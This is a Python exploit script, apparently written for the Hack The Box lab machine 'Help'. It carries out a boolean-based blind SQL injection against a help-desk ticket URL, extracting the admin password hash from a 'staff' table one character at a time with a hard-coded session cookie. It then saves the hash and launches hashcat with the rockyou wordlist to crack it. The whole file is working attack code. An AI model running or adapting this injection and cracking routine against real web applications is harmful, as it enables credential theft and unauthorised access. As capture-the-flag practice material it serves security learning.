import requests
import string
from os import system


proxy = { 'http': 'http://127.0.0.1:8080' }

headers = { 
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
    "Cookie": "lang=english; PHPSESSID=3t2h3k83fna696mo8roe0eu660; usrhash=0Nwx5jIdx%2BP2QcbUIv9qck4Tk2feEu8Z0J7rPe0d70BtNMpqfrbvecJupGimitjg3JjP1UzkqYH6QdYSl1tVZNcjd4B7yFeh6KDrQQ%2FiYFsjV6wVnLIF%2FaNh6SC24eT5OqECJlQEv7G47Kd65yVLoZ06smnKha9AGF4yL2Ylo%2BG73D1J%2F3JRNYR1rFFKcJhKvuHxdvxEMP4DE7aqVkXAqw%3D%3D"    
}

def formUrl(char, i):
    payload = f"AND SUBSTRING((SELECT password FROM staff WHERE username = 'admin'), {i}, 1) = '{char}'"
    url = f"http://help.htb/support/?v=view_tickets&action=ticket&param[]=4&param[]=attachment&param[]=1&param[]=6 {payload}-- -"
    return url

def sqliH():
    password = ""
    while len(password) < 40:
        i = len(password) + 1
        for char in string.digits + string.ascii_letters: 
            url = formUrl(char, i)
            r = requests.get(url, headers=headers, proxies=proxy)
            if "Entender" in r.text:
                password += char
                print("Senha:",password, end="\r")
                break
            
    return password  

if __name__ == '__main__':
    print("Getting password hash...")
    passs = sqliH()
    print("Got it!\n")
    print(f"Senha: {passs}")
    print("Cracking hash...\n")
    file = open("hash", "w")
    file.write(passs)
    file.close()
    system('mv hash ../Machines/')
    system('hashcat -a 0 -d 1 -m 100 ../Machines/hash --wordlist /usr/share/wordlists/rockyou.txt')
